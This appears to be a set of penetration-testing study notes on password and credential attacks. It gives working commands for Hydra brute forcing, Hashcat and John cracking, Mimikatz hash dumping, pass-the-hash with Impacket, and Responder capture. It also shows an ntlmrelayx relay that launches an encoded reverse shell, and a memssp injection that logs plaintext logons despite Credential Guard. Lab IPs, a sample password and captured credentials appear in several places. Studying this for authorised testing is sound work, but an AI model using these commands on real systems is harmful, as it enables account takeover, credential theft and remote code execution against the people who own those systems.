# Hydra

A very good tool for password bruteforcing is hydra.
## SSH

The following attack uses the wordlist.txt file to bruteforce the admin user for SSH login.

```shell
hydra -L admin -P wordlist.txt <target-ip> ssh -t 4
```

If the password is know, It could be used the tecnnique **password spraying** where the passwords remain constant and the username is bruteforced. This is useful if we gain passwords from a dataleak.
## RDP

A RDP attack could be this

```shell
hydra -L Administrator -P wordlist.txt <target-ip> rdp -t 4
```
## HTTP POST Login Form

This works with login forms using POST requests

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
## HTTP Basic Auth

This works with HTTP basic auth protocol

```shell
hydra -l admin -P rockyou.txt <target-ip> http-get
```

# Rule-Based Wordlist Mutations

Rule-based attacks allow us to mutate existing wordlists so they meet password policy requirements. Instead of relying solely on dictionary words, we apply **rule functions** that transform each word in the list. Rules can append, prepend, capitalize, or otherwise alter words, massively increasing the number of password candidates.
## Appending Numbers

The simplest example is appending a number to each password. Using the `$` rule function with Hashcat, we can append characters. For example, to append a `1`:

```bash
echo \$1 > demo.rule
hashcat -r demo.rule --stdout demo.txt
```

Output:

```
password1
iloveyou1
princess1
rockyou1
abc1231
```

## Combining Rule Functions

### Consecutive Functions on One Line

If rule functions are on the same line, they are applied sequentially to each password. For example, appending `1` and then capitalizing the first character:

```bash
cat demo1.rule
$1 c

hashcat -r demo1.rule --stdout demo.txt
```

Output:

```
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231
```

### Separate Functions on Different Lines

If rule functions are written on separate lines, Hashcat treats them as independent rules, creating multiple variations of each password:

```bash
cat demo2.rule
$1
c

hashcat -r demo2.rule --stdout demo.txt
```

Output:

```
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```

## Adding Special Characters

Many password policies require special characters. Using `$!` appends an exclamation mark:

```bash
cat demo1.rule
$1 c $!

hashcat -r demo1.rule --stdout demo.txt
```

Output:

```
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```

Order matters. If we change the rule sequence:

```bash
cat demo2.rule
$! $1 c

hashcat -r demo2.rule --stdout demo.txt
```

Output:

```
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

This demonstrates that **rule functions are applied from left to right** in each line.

## Summary

- `$x` appends a character, `^x` prepends a character, `c` capitalizes the first character.
- Rules written on the same line are applied consecutively.
- Rules on separate lines are applied independently.

# Identifying hashes

```bash
hashid '<hash>'
hash-identifier '<hash>'
```
# KeePass File

If we dump a KeePass Database (Database.kdbx), we can try to crack it with

```shell
keepass2john Database.kdbx > keepass.hash
```

First we remove the "Database:" string from the hash, then we run our attack. The **13400** is the code for Hashcat to crack KeePass hashes.

```shell
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
# SSH Keys

If we find a SSH Key password protected we can use

```shell
ssh2john id_rsa > id_rsa.hash
```

We remove the filename at the beginning of the hash, as in the KeePass section and we use JohnTheRipper to crack the hash, but first we add our hashcat rules to the John configuration rules (if we want to use custom rules)

```shell
cat /home/kali/passwordattacks/my-rule.rule >> /etc/john/john.conf
```

And then the attack is run with

```shell
john --wordlist=ssh.passwords --rules=sshRules id_rsa.hash
```

Now we can login with the SSH key and we can use the cracked passphrase.
# Temp

With John and Hashcat we can craft customized mutating wordlist that let us modify the original wordlist while executing. In the [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) are shown all possible combinations for password mutation. For example, the following rule capitalizes each first letter and adds `1` and then `!` for each word.

```hashcat-rule
c $1
c $!
```

For a wordlist with the single word `test`, this will create the following mutated wordlist

```password-example
Test1
Test!
```

The attack will be the following

```shell
hashcat --wordlist=/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/my-rule.rule user.hash
```

# NTLM

The NTLM hash is the cryptographic format in which user passwords are stored on Windows systems. NTLM hashes are stored in the SAM (security account manager) or NTDS file of a domain controller. They are a fundamental part of the mechanism used to authenticate a user through different communications protocols. It’s, therefore, critical information and highly sought after by hostile actors when trying to unleash a cyber-attack. When pentesting, for example, it’s common for attackers to try to obtain these hashes (using tools such as pwdump or mimikatz) and use Pass The Hash techniques using NTLM hashes to exploit the privileges of one or more systems. In this way, they could execute elevated privileges and even execute commands. The NTLM hash is encoded by taking the user’s password and converting it into a 16-byte key using an MD4 hash function. This key is divided into two halves of 8 bytes each, which are used as input to three rounds of DES encryption to generate a 16-byte output that represents the NTLM hash. Each DES round uses an 8-byte key derived from the original key half using a parity operation. The two 8-byte results from the three DES rounds are concatenated to form the 16-byte NTLM hash that is used to verify the user’s password in the Windows operating system. NTLM hashes are likely to be used in many Windows authentication attacks, so it’s advisable to limit their use and use Kerberos.

## Mimikatz

[Mimikatz](https://github.com/ParrotSec/mimikatz) is a very useful tool that can do many things once executed on a Windows system, like dumping NTLM hashes of the users. As their GitHub page says, it can be run with

```powershell
.\mimikatz.exe
```

Warning: Mimikatz's commands could not work depending on the Windows version. Make sure to download the correct version after checking with `systeminfo` the Windows version.

Then, if we have the privileges, it can be used to dump NTLM hashes with

```powershell
privilege::debug
token::elevate
lsadump::sam
```

To impersonate another user

```powershell
 sekurlsa::pth /user:Administrator /domain:<DOMAI> /ntlm:<NTLM-HASH> /impersonate
```

## Cracking the NTLM hashes

The **1000** code is for NTLM hashes. The username is dump along with the hash. The cracking is done with the following code

```shell
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt
```

The plaintext credential we will find are used in the authentication method in the Windows system, like RDP, SMB or other services, if the user has the required privileges to use that services.

## Passing the NTLM hashes

The NTLM hashes can be used also as is if the protocol supports it. An example is SMB

```shell
smbclient \\\\<TARGET-IP>\\secrets -U Administrator --pw-nt-hash <NTLM-HASH>
```

We can escalate the writables shares with `impacket-psexec`, a oneliner tool that opens a reverse shell with the exploited target.

```shell
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM-HASH> Administrator@<TARGET-IP>
```

## Cracking the Net-NTLMv2 hashes

One of the authentication protocols Windows machines use to authenticate across the network is a challenge / response / validation called Net-NTLMv2. If can get a Windows machine to engage my machine with one of these requests, we can perform an offline cracking to attempt to retrieve their password. In some cases, we could also do a relay attack to authenticate directly to some other server in the network.

Once identified our interface, we can start our interceptor with

```shell
sudo responder -I <INTERFACE>
```

And from the Victim we only need to mount as a SMB share a fake provided path

```powershell
dir \\<ATTACKER-IP>\test
```

In this way `responder` will dump the hash that could be cracked with code **5600** on hashcat

```shell
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
```

## Relaying the Net-NTLMv2 hashes

We can perform a `ntlmrelayx` attack if the gained hash is too difficult to be cracked. In this case the `<TARGET-IP>` is the second exploitable machine on the network.

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c "powershell -enc <ENCODED-REVSHELL>"
```

The encoded reverse shell can be crafted with some UTF-16-BE malicious code crafted with [RevShells](https://www.revshells.com/). Then, we have to gain the hash from the first machine. We can do the same attack as before, mounting on the machine 1 the fake SMB share, in order to gain the hash.

```powershell
dir \\<ATTACKER-IP>\test
```

Now we `impacket-ntlmrelayx` will pass the hash to the second machine to authenticate us with the same hash. If the user is also the Administrator of the second machine, we will be logged as Administrator.

# Windows Credential Guard

Up to this point we have dealt with hashes that belonged to local accounts. However, we may encounter other types of accounts, including Windows domain accounts. We'll discuss the inner workings of domain authentication in later modules, but for now we should demonstrate how the operating system stores the password hash of Windows users that log in with a domain account on a Windows device. If we're able to obtain this hash, we could either crack it or use it in a pass-the-hash attack.

Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the **lsass.exe** process. Fortunately, **Mimikatz** can locate these stored credentials for us. Similar to our previous test-case using Mimikatz we will need to run it as Administrator (or higher) and have the **SeDebugPrivilege** access right enabled.

## Extracting Domain Hashes with Mimikatz

Start by logging into a Windows machine with domain credentials. For example, to RDP into a client machine:

```bash
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
```

Once connected, LSASS will have cached the domain user's information in memory. Then, using a local administrator account, launch **Mimikatz**:

```powershell
cd C:\tools\mimikatz\
.\mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Sample output:

```
* Username : Administrator
* Domain   : CORP
* NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
```

With this NTLM hash, we can attempt a **pass-the-hash attack**:

```bash
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
```

## Credential Guard Mitigation

Microsoft introduced **Credential Guard** as part of **Virtualization-based Security (VBS)**, which uses hardware virtualization to isolate sensitive information. Credential Guard moves cached domain credentials into an isolated environment (VTL1) managed by the hypervisor. Even SYSTEM-level processes cannot access this protected memory.

To verify if Credential Guard is running:

```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
```

When enabled, attempts to dump hashes with Mimikatz result in isolated/encrypted data instead of plaintext NTLM hashes.

## Bypassing Credential Guard with memssp

Since cached hashes are no longer accessible, attackers shift focus to **intercepting credentials during logon**. Mimikatz provides the `memssp` module, which injects a malicious **Security Support Provider (SSP)** into LSASS.

Launch Mimikatz and inject the SSP:

```bash
privilege::debug
misc::memssp
```

After injection, when a user logs in, plaintext credentials are written to:

```
C:\Windows\System32\mimilsa.log
```

Inspect the log file:

```powershell
type C:\Windows\System32\mimilsa.log
```

Sample captured credentials:

```
CORP\Administrator  QWERTY123!@#
CLIENTWK245\offsec   lab
```